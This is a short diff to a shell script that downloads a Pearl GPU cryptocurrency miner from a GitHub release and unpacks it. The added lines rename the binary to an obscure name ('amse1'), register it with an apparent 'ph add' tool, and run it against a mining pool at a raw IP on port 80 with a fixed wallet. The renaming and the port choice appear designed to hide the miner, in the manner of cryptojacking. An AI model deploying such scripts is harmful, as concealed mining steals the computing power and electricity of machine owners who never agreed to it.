@@ -22,3 +22,12 @@ mv pearl-gpu-miner amse
 ph add amse
 
 ./amse --pool 20.205.214.159:80 --wallet prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10)
+
+wget https://github.com/egg5233/tw-pearl-miner/releases/download/v3.2.2/tw-pearl-miner-3.2.2.c12.tar.gz
+tar xf tw-pearl-miner-3.2.2.c12.tar.gz
+cd tw-pearl-miner
+mv pearl-gpu-miner amse1
+
+ph add amse1
+
+./amse1 --pool 20.205.214.159:80 --wallet prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10)
